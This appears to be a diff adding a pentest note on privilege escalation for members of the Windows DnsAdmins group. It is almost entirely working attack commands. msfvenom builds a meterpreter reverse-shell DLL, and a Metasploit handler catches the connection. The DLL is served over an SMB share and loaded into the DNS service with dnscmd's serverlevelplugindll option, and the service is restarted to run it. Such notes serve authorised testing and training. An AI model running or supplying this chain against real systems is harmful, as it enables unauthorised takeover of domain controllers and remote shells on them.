@@ -1,0 +1,26 @@
+1st confirm the user is in dnsadmin group. Check ActiveDirectory Enumeration for more information.
+
+As DNSAdmin you can privilege escalate by abusing the dnscmd
+
+Build your malicious DLL.
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=yourip LPORT=yourport -f dll > evil.dll
+
+Setup your handler for incoming connection.
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST tun0
+LHOST => tun0
+msf5 exploit(multi/handler) > set LPORT yourport
+LPORT => yourport
+msf5 exploit(multi/handler) > run
+
+Create your share
+smbserver.py sharename /path/to/smbdirectory/ -smb2support
+
+Inject your reversetcp payload on the dnsserver
+dnscmd hostname /config /serverlevelplugindll \\yourip\sharename\evil.dll
+
+Restart your service to exploit
+sc.exe stop dns
+sc.exe start dns
